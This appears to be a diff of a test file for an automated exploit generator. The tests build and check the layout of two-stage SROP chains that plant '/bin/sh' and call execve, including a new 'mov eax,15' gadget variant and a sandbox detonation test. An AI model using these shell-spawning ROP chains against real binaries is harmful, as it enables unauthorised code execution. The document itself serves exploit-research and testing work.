@@ -33,7 +33,7 @@ def test_srop_feasible_reports_pieces():
     # a syscall;ret gadget with no pop-rax / writable / binsh -> feasible shape, missing pieces
     blob = b"\x7fELF\x02\x01\x01" + b"\x00" * 57
     feo = rop.srop_feasible(blob)
-    assert set(feo) == {"syscall", "pop_rax", "writable", "binsh"}
+    assert set(feo) == {"syscall", "pop_rax", "rax15", "writable", "binsh"}
 
 
 # --- 2-stage SROP that PLANTS "/bin/sh" (no /bin/sh in the image) --------------------------------
@@ -45,7 +45,8 @@ from lykos.analyze.dynamic import sandbox  # noqa: E402
 
 
 def test_build_srop_execve_plant_structure():
-    s1, s2 = rop.build_srop_execve_plant(40, syscall=0x401128, pop_rax=0x401126, writable=0x404040)
+    s1, s2 = rop.build_srop_execve_plant(40, syscall=0x401128, rax15=(0x401126, "pop"),
+                                         writable=0x404040)
     q = lambda b, o: struct.unpack_from("<Q", b, o)[0]
     # stage1: cyclic(40) + (pop rax;15;syscall) + a read-frame that pivots rsp INTO `writable`
     assert q(s1, 40) == 0x401126 and q(s1, 48) == 15 and q(s1, 56) == 0x401128
@@ -132,3 +133,21 @@ def test_srop_execve_plant_detonates_l3(store, case, pool, srop_bin):
 def enqueue_exploit_or_skip(q, t):
     from lykos.analyze.poc import enqueue_exploit
     return enqueue_exploit(q, t, params={"offset": 40})
+
+
+def test_srop_plant_generalized_rax15_mov_variant():
+    """rax=15 via a `mov eax,15;ret` gadget (kind 'mov') -- no `pop rax` needed. The chain then
+    has [gadget][syscall] with NO 15 word between them (a pop-rax chain would have one)."""
+    s1, s2 = rop.build_srop_execve_plant(40, syscall=0x401128, rax15=(0x401200, "mov"),
+                                         writable=0x404040)
+    q = lambda b, o: struct.unpack_from("<Q", b, o)[0]                    # noqa: E731
+    assert q(s1, 40) == 0x401200 and q(s1, 48) == 0x401128               # gadget then syscall
+    assert struct.unpack_from("<Q", s1[56:56 + 248], 0x90)[0] == 0       # read-frame follows (rax=0)
+    assert q(s2, 0) == 0x401200 and q(s2, 8) == 0x401128
+    assert s2[0x120:0x128] == b"/bin/sh\x00"
+
+
+def test_find_rax15_detects_pop(srop_bin):
+    kind = rop.find_rax15(srop_bin.read_bytes())
+    assert kind is not None and kind[1] in ("pop", "mov")   # srop fixture supplies pop rax;ret
+    assert rop.srop_feasible(srop_bin.read_bytes())["rax15"] == kind
